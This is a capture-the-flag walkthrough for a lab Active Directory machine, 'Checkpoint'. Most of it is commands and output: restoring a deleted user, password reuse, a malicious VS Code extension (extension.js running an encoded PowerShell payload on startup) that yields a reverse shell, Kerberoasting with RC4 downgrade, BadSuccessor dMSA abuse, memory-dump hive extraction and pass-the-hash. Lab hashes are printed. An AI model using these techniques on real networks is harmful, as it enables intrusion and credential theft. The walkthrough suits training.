
![logo](Images/logo.png)

# Attack Chain

```
alex.turner (initial creds)
  └─► restore tombstone → mark.davies
    └─► password reuse (Checkpoint2024!) → mark.davies
        └─► WRITE on DevDrop → drop malicious .vsix
            └─► RCE → shell as ryan.brooks
                └─► TGT (Rubeus tgtdeleg) → rusthound collection
	                └─► GenericWrite on svc_deploy (Kerberoast KO)
                        └─► CREATE_CHILD on OU=DMSAHolder → BadSuccessor → svc_deploy
	                        └─► BackupAccess → VMBackups share
                                └─► memory dump (.vmem) → Volatility → hives
                                    └─► secretsdump → Administrator → DA
```
# Summary

- [Enumeration](#enumeration)
	- [nmap](#nmap)
	- [SMB Shares](#smb-shares)
	- [ACLs](#acls)
- [Mark.Davies compromise](#markdavies-compromise)
	- [Shadow Credentials](#shadow-credentials)
	- [Kerberoast](#kerberoast)
	- [Password reuse](#password-reuse)
- [Malicious .vsix](#malicious-vsix)
	- [Craft the Archive](#craft-the-archive)
	- [Shell as ryan.brooks](#shell-as-ryanbrooks)
- [Lateral Movement](#lateral-movement)
	- [Obtain a TGT for ryan.brooks](#obtain-a-tgt-for-ryanbrooks)
	- [Second Kerberoast attempt](#second-kerberoast-attempt)
	- [BadSuccessor](#badsuccessor)
- [Privilege Escalation](#privilege-escalation)
	- [VMBackups share](#vmbackups-share)
	- [Extract system's hives](#extract-systems-hives)
	- [Registry hives dump](#registry-hives-dump)
	- [Shell as administrator](#shell-as-administrator)

---

As is common in real life pentests, you will start the Checkpoint box with credentials for the following account alex.turner / Checkpoint2024!
# Enumeration

### nmap

Let's start by scanning the target.

```bash
nmap -sCV 10.129.*.*
Starting Nmap 7.93 ( https://nmap.org ) at 2026-06-13 23:16 CEST
Nmap scan report for 10.129.*.*
Host is up (0.041s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-06-14 04:16:55Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

> [!NOTE]
> **Observations**
> - Target is an Active Directoy (kerberos, ldap, smb, etc...).
> - Domain is `checkpoint.htb`.
> - FQDN is `DC01.checkpoint.htb`.

### SMB Shares

We can continue our enumeration by scanning the shares available.

```bash
nxc smb 10.129.*.* -u 'alex.turner' -p 'Checkpoint2024!' --shares

<SNIP>

SMB      10.129.*.*   445    DC01        Share           Permissions     Remark
SMB      10.129.*.*   445    DC01        -----           -----------     ------
SMB      10.129.*.*   445    DC01        ADMIN$                          Remote Admin

SMB      10.129.*.*   445    DC01        C$                              Default share

SMB      10.129.*.*   445    DC01        DevDrop         READ            VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0

SMB      10.129.*.*   445    DC01        IPC$            READ           Remote IPC

SMB      10.129.*.*   445    DC01        NETLOGON        READ           Logon server share 

SMB      10.129.*.*   445    DC01        SYSVOL          READ           Logon server share 

SMB      10.129.*.*   445    DC01        VMBackups                    
```

There is 2 uncommon shares `DevDrop` and `VMBackups` looks interesting but we do not have any permission on the last one though.

`DevDrop` is a share used to stock VS Code extension (`.vsix`), there are techniques to exploit that and gain a foothold on the target but we would need `WRITE` permission to put our malicious file inside the share. Let's move on for now and get back at this later.
### ACLs

`bloodhound-python` (both the legacy and CE collector) doesn't implement GSSAPI sealing on port 389. Since the target enforces signing, it gives up on 389 and falls back to LDAPS (636), which is broken on this box (RST before the TLS handshake). 
The collection therefore fails every time. Tools that negotiate GSSAPI sign+seal directly on 389 (rusthound-ce, NetExec, bloodyAD) are unaffected. We'll use rusthound later once we have a TGT.

To have a first look of what ACLs we have with our user, we can use `bloodyAD`.

```bash
bloodyAD -H 10.129.*.* -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb get writable

distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
DACL: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: OU=Employees,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD
```

We have `WRITE` on the `Deleted Objects` and on the user `mark.davies` which has been deleted. But since we have the appropriate rights, we can restore it.

```bash
bloodyAD -H 10.129.*.* -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb set restore 'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'

[+] CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
```

# Mark.Davies compromise

Now that the user `Mark.Davies` is restored and that we have `Write` on the object, we need to find a way to compromise it by gaining its credentials.

### Shadow Credentials

First thing we can try is to perform a **Shadow Credentials** attack.

```bash
bloodyAD -H 10.129.*.* -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' add shadowCredentials 'CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb'

[+] KeyCredential generated with following sha256 of RSA key: 3410fa0ed69c12991c0e7a4c317c2d3c66ce85c418f4c34ce1876f76df8fc85d
[-] PKINIT failed on DC 10.129.*.*, you must find a Kerberos server with a certification authority!
[-] Retry on a working KDC and do:
badNTPKInit 'kerberos+pfx://checkpoint.htb\mark.davies@10.129.*.*/?certdata=mark.davies_0N.pfx&timeout=350'
[+] PKINIT PFX certificate saved at: mark.davies_0N.pfx

<SNIP>

raise KerberosError(krb_message)
kerbad.protocol.errors.KerberosError:  Error Name: KDC_ERR_PADATA_TYPE_NOSUPP Detail: "KDC has no support for PADATA type (pre-authentication data)" 
```

> [!CAUTION]
> **Failed**
> The attack failed because the target probably doesn't have any certificate available on the target, so we can't contact PKINIT and request a certificate for the user.
>

In a real assessment we would remove the key so let's do it.

```bash
bloodyAD -H 10.129.*.* -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' remove shadowCredentials 'CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb'
[+] All keys removed
```

### Kerberoast

Another method is to add an **SPN** to the target in order to **kerberoast** it.

```bash
bloodyAD -H 10.129.*.* -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' set object mark.davies servicePrincipalName -v 'hacked/hacked'
```

Now that the attribute has been modified, we can request a TGS for the user and attempt to retrieve the password of `Mark.Davies`.

```
GetUserSPNs.py checkpoint.htb/alex.turner:'Checkpoint2024!' -request -o hash.mark
```

Let's use `hashcat` to crack it.

```bash
hashcat hash.mark /usr/share/wordlists/rockyou.txt

<SNIP>

Session..........: hashcat                                
Status...........: Exhausted

<SNIP>
```

The password couldn't be cracked, let's restore the attribute to its default value.

```bash
bloodyAD -H 10.129.*.* -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' set object mark.davies servicePrincipalName
[+] mark.davies's servicePrincipalName has been updated
```

### Password reuse

There is not much we can do here. 
Last thing we can try is to see if the account has the same password as our user.

```bash
nxc smb 10.129.*.* -u mark.davies -p 'Checkpoint2024!'
LDAP    10.129.*.*   389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert)
 
LDAP    10.129.*.*   389    DC01     [+] checkpoint.htb\mark.davies:Checkpoint2024! 
```

It worked ! 

> [!TIP]
> **Credentials found**
> `mark.davies`:`Checkpoint2024!`

Let's check our permission on the shares to see if it changed.

```bash
nxc smb 10.129.*.* -u mark.davies -p 'Checkpoint2024!' --shares

<SNIP>

SMB         10.129.*.*   445    DC01             [*] Enumerated shares
SMB         10.129.*.*   445    DC01             Share           Permissions     Remark
SMB         10.129.*.*   445    DC01             -----           -----------     ------

SMB         10.129.*.*   445    DC01             ADMIN$                          Remote Admin

SMB         10.129.*.*   445    DC01             C$                              Default share

SMB         10.129.*.*   445    DC01             DevDrop         READ,WRITE      VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0

SMB         10.129.*.*   445    DC01             IPC$            READ            Remote IPC

SMB         10.129.*.*   445    DC01             NETLOGON        READ            Logon server share 

SMB         10.129.*.*   445    DC01             SYSVOL          READ            Logon server share 

SMB         10.129.*.*   445    DC01             VMBackups                       

```

We finally has `WRITE` permission on `DevDrop`.

# Malicious .vsix

We can use the technique mentioned [here](https://pentestlab.blog/2024/03/04/persistence-visual-studio-code-extensions/), to craft a malicious VS Code extension that will execute our payload when imported by an user.

### Craft the Archive

To perform our attack, we must first create the file `package.json` so it match the version of VS Code of the target.

**package.json**
```json
{
  "name": "approved-ext",
  "displayName": "Approved Extension",
  "publisher": "it",
  "version": "1.0.0",
  "description": "Approved internal extension",
  "engines": { "vscode": "^1.118.0" },
  "activationEvents": ["onStartupFinished"],
  "main": "./extension.js",
  "contributes": {}
}
```

Next, we create our extension containing the payload.
The `.vsix` is packaged in JavaScript (not TypeScript): VS Code runs the JS directly on load. The `activate()` function is triggered by the `onStartupFinished` activation event, so the payload fires as soon as the server-side sync script opens VS Code and no user interaction is required.

**extension.js**
```javascript
const vscode = require('vscode');
function activate(context) {
  const cp = require('child_process');
  const cmd = 'powershell -e <base64_payload>';
  cp.exec(cmd, (err, stdout, stderr) => {});
}
function deactivate() {}
module.exports = { activate, deactivate };
```

Before compiling our `.vsix`, we need to create a `README.md` to prevent conflict.

```bash
echo "# hacked" > README.md
```

Now we can package it.

```bash
vsce package
```

### Shell as ryan.brooks

Our `.vsix` file has been created.

We start our listener and put it inside the `DevDrop` share.

```bash
smbclient -U mark.davies //10.129.*.*/DevDrop
smb:> put hacked.vsix
```

Let's wait a moment to see if we get a connection back on our listener.

```bash
penelope -i tun0 -p 6767
[+] Listening for reverse shells on 10.10.*.*:6767 
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => DC01 10.129.*.* Microsoft_Windows_Server_2025_Standard-x64-based_PC 👤 checkpoint\ryan.brooks 😍️ Session ID <1>
[+] Added readline support...
[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
[+] Session log: /home/*/.penelope/sessions/DC01~10.129.*.*-Microsoft_Windows_Server_2025_Standard-x64-based_PC/2026_06_15-12_28_31-102-checkpoint\ryan.brooks.log
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
PS C:\Program Files\Microsoft VS Code> whoami
checkpoint\ryan.brooks
```

> [!TIP]
> **We have a shell as `ryan.brooks`.**

# Lateral Movement

### Obtain a TGT for ryan.brooks

We have a shell as `ryan.brooks` but we do not have its password. In order to be able to authenticate with our tools for that user, we need to retrieve its TGT using `Rubeus.exe`.

We transfer it to the target and we run the following :

```bash
.\Rubeus.exe tgtdeleg /nowrap
```

Next we copy the output to a `.kirbi` file.

```bash
echo '<base64>' | base64 -d > ryan.kirbi
```

And we convert it to a real TGT.

```bash
ticketConverter.py ryan.kirbi ryan.ccache
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
```

### Bloodhound

To have a better view on the domain, we can still collect data with the tool `rusthound` which do not have the limitations of the bloodhound collector..

And since we have a TGT for `ryan.brooks`, we can force the authentication on port 389.

We have to modify our `/etc/krb5.conf` file before so it resolve the KDC of the target.

```bash
cat > /etc/krb5.conf <<'EOF'
[libdefaults]
    default_realm = CHECKPOINT.HTB
    dns_lookup_kdc = false
    dns_lookup_realm = false

[realms]
    CHECKPOINT.HTB = {
        kdc = dc01.checkpoint.htb
        admin_server = dc01.checkpoint.htb
    }

[domain_realm]
    .checkpoint.htb = CHECKPOINT.HTB
    checkpoint.htb = CHECKPOINT.HTB
EOF

```

Let's collect data

```bash
export KRB5CCNAME=ryan.ccache
```

```bash
rusthound -d "checkpoint.htb" -u "ryan.brooks"@"checkpoint.htb" -k -f dc01.checkpoint.htb
```

And we import the data inside Bloodhound.

![GenericWrite SVC_DEPLOY](Images/GenericWrite%20SVC_DEPLOY.png)

We have `GenericWrite` on the user `svc_deploy`.

### Second Kerberoast attempt

From our reverse shell, we can add an SPN to the user.

```bash
PS C:\Users\ryan.brooks\Desktop> setspn -s hacked/hacked svc_deploy

Checking domain DC=checkpoint,DC=htb

Registering ServicePrincipalNames for CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
	hacked/hacked
Updated object
```

Since it's a service account, the encryption used is probably AES256 (default), we can downgrade the encryption to RC4 since we have GenericWrite to accelerate the cracking process.

```bash
bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -k \
  set object svc_deploy msDS-SupportedEncryptionTypes -v 4
[+] svc_deploy's msDS-SupportedEncryptionTypes has been updated
```

We request a TGS for `svc_deploy`.

```bash
GetUserSPNs.py -k -no-pass checkpoint.htb/ -dc-ip 10.129.*.* -request -o hash.svc_deploy
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name        MemberOf                                                 PasswordLastSet             LastLogon  Delegation 
--------------------  ----------  -------------------------------------------------------  --------------------------  ---------  ----------
hacked/hacked         svc_deploy  CN=BackupAccess,OU=ServiceAccounts,DC=checkpoint,DC=htb  2026-05-09 05:01:19.573610  <never>               s
```

But we have the same issue as before, the hash couldn't be cracked.

### BadSuccessor

Let's have a deeper view of our ACLs with `bloodyAD`.

```bash
bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -u ryan.brooks -k get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: OU=DMSAHolder,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=Ryan Brooks,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

```

We have `WRITE` access on the OU `DMSAHolder`.

dMSA = delegated Managed Service Account, it's a new feature inside Windows Server 2025 (which is the target's OS here).
There is a vulnerability with these account called **BadSuccessor**.

A dMSA account can be marked as "successor" of an existing account with the attribute `msDS-ManagedAccountPrecededByLink` and `msDS-DelegatedMSAState`. 
When we do it, the KDC consider that the dMSA inherit the keys/privileges of a predecessors account, even the privileged ones such as `administrator`.

If we create a dMSA inside the OU where we have CREATE_CHILD, it will link to the targeted account and we gain its TGT.

Let's try to obtain a TGT for `administrator`.

```bash
bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb \
  -u ryan.brooks -k \
  add badSuccessor hackeddmsa \
  --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb' \
  -t 'CN=Administrator,CN=Users,DC=checkpoint,DC=htb'
[+] Creating DMSA hackeddmsa$ in OU=DMSAHolder,DC=checkpoint,DC=htb
[+] Impersonating: CN=Administrator,CN=Users,DC=checkpoint,DC=htb

<SNIP>

(ERROR_DS_INSUFF_ACCESS_RIGHTS) Insufficient access rights to perform the operation.
```

We couldn't perform the attack on `administrator` since the patch has been deployed. On theses build, **BadSuccessor** need a `WRITE` access on the targeted account to complete the attack.

But since we have `WRITE` on `svc_deploy`, it means we can target the account instead.

Let's remove first the created dMSA .

```bash
bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -k -u ryan.brooks remove object CN=hackeddmsa,OU=DMSAHolder,DC=checkpoint,DC=htb
[+] CN=hackeddmsa,OU=DMSAHolder,DC=checkpoint,DC=htb has been removed
```

We can now target `svc_deploy`.

```bash
bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb \
  -u ryan.brooks -k \
  add badSuccessor hackeddmsa \
  --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb' \
  -t 'CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb'
[+] Creating DMSA hackeddmsa$ in OU=DMSAHolder,DC=checkpoint,DC=htb
[+] Impersonating: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb

Realm        : CHECKPOINT.HTB
Sname        : krbtgt/CHECKPOINT.HTB
UserName     : hackeddmsa$
UserRealm    : checkpoint.htb
StartTime    : 2026-06-15 20:14:49+00:00
EndTime      : 2026-06-16 02:58:23+00:00
RenewTill    : 2026-06-22 16:58:23+00:00
Flags        : forwardable, renewable, enc-pa-rep, pre-authent, forwarded
Keytype      : 18
Key          : x2LUO2DoGTZEZ8cAwcGShc2FOa5qimGq5yg1TIJ6nJI=
EncodedKirbi : 

    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
    Q0tQT0lOVC5IVEI=
[+] dMSA TGT stored in ccache file hackeddmsa_HG.ccache

dMSA current keys found in TGS:
AES256: 2bf3e6b6bc91debbf4d5beac5b17efc85a29eaa00c8ea276eec2d04c5444187b
AES128: 97a21dddfbd02b43c52cdb408891df81
RC4: b41768e37fba3afd84b5cd203967f44a

dMSA previous keys found in TGS (including keys of preceding managed accounts):
RC4: e16081eb077aca74bdbf8af12af43ac9
```

The attack worked ! Let's confirm the credentials with `NetExec`.

```bash
nxc smb 10.129.*.* -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9
SMB         10.129.*.*   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)

SMB         10.129.*.*   445    DC01             [+] checkpoint.htb\svc_deploy:e16081eb077aca74bdbf8af12af43ac9 
```

> [!TIP]
> **Credentials found**
> `svc_deploy`:`e16081eb077aca74bdbf8af12af43ac9`

# Privilege Escalation

There is still a share we didn't access yet. Let's see if our new user has permissions on it.
### VMBackups share

```bash
nxc smb 10.129.*.* -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9 --shares

<SNIP>
 
SMB         10.129.*.*   445    DC01             VMBackups       READ           
```

We finally have `READ` right, let's connect to the share.

```bash
smbclient '//10.129.*.*/VMBackups' \
  -U 'checkpoint.htb/svc_deploy' --pw-nt-hash e16081eb077aca74bdbf8af12af43ac9
```

```bash
smb: \NightlyBackup_2024-11-01\memory forensics\> ls
  .                                   D        0  Sat May  9 13:12:44 2026
  ..                                  D        0  Sat May  9 12:54:19 2026
  Windows Server 2019-000001.vmdk      A 106496000  Sat May  9 22:45:22 2026
  Windows Server 2019-Snapshot1.vmem      A 2147483648  Sat May  9 22:40:36 2026
  Windows Server 2019-Snapshot1.vmsn      A 138164859  Sat May  9 22:40:36 2026
  Windows Server 2019.nvram           A   270840  Sat May  9 22:39:00 2026
  Windows Server 2019.scoreboard      A     7642  Sat May  9 22:45:22 2026
  Windows Server 2019.vmdk            A 10199695360  Sat May  9 22:39:00 2026
  Windows Server 2019.vmsd            A      502  Sat May  9 22:39:00 2026
  Windows Server 2019.vmx             A     2749  Sat May  9 22:45:22 2026
  Windows Server 2019.vmxf            A      274  Sat May  9 22:22:44 2026

		10459391 blocks of size 4096. 2475856 blocks available

```
```
smb: \NightlyBackup_2024-11-01\memory forensics\> get "Windows Server 2019-Snapshot1.vmem"
```

There are several artefacts, but the most interesting are those concerning the memory since it probably contains some valuable information such as the hashes of the target or even the content of registry hives.

Let's download `Windows Server 2019-Snapshot1.vmem` and `Windows Server 2019-Snapshot1.vmsn`.

### Extract system's hives

We will now use `volatility` to extract the informations we need.

```bash
vol -f 'Windows Server 2019-Snapshot1.vmem' windows.info
Volatility 3 Framework 2.28.0
WARNING  volatility3.framework.layers.vmware: No metadata file found alongside VMEM file. A VMSS or VMSN file may be required to correctly process a VMEM file. These should be placed in the same directory with the same file name, e.g. Windows%20Server%202019-Snapshot1.vmem and Windows%20Server%202019-Snapshot1.vmss.
Progress:  100.00		PDB scanning finished                                                                                              
Variable	Value

Kernel Base	0xf80725608000
DTB	0x1ad000
Symbols	file:///home/makiss/.local/share/pipx/venvs/volatility3/lib/python3.13/site-packages/volatility3/symbols/windows/ntkrnlmp.pdb/EF9A48AFA50FF07C616585BB01919536-1.json.xz
Is64Bit	True
IsPAE	False
layer_name	0 WindowsIntel32e
memory_layer	1 FileLayer
KdVersionBlock	0xf80725a08f10
Major/Minor	15.17763
MachineType	34404
KeNumberProcessors	2
SystemTime	2026-05-09 14:08:58+00:00
NtSystemRoot	C:\Windows
NtProductType	NtProductServer
NtMajorVersion	10
NtMinorVersion	0
PE MajorOperatingSystemVersion	10
PE MinorOperatingSystemVersion	0
PE Machine	34404
PE TimeDateStamp	Sun Nov 10 07:20:39 2075
```

We indeed could retrieve the OS informations, let's dump the registry hives now.

```bash
vol -f 'Windows Server 2019-Snapshot1.vmem' -o . windows.registry.hivelist --dump
```

### Registry hives dump

We can now use `secretsdump.py` to dump the hashes of the local account of the target.

```bash
secretsdump.py -sam registry.SAM.0xc30a3278e000.hive -system registry.SYSTEM.0xc30a2fe38000.hive LOCAL

Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x75247bc64fa0086d2c98744d4bcd53f5
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f29e9c014295b9b32139b09a2790be3b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:28f8d934dee90b2ec824351cb0844479:::
[*] Cleaning up... 
```

> [!TIP]
> **Hashes dumped**

### Shell as administrator

The dumped hash is the local Administrator of the backup (SAM account of the Windows Server 2019 VM). We can check whether it's reused for the domain Administrator on the current DC.

```bash
nxc smb 10.129.*.* -u administrator -H f29e9c014295b9b32139b09a2790be3b
SMB         10.129.*.*   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)

SMB         10.129.*.*   445    DC01             [+] checkpoint.htb\administrator:f29e9c014295b9b32139b09a2790be3b (Pwn3d!)
```

We have valid credentials for `administrator`, let's connect to the target with `evil-winrm`.

```bash
evil-winrm -u administrator -H f29e9c014295b9b32139b09a2790be3b -i 10.129.*.*

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

The root flag is on max.palmer's Desktop (the actual privileged account on the host).


> [!TIP]
> **Machine rooted**

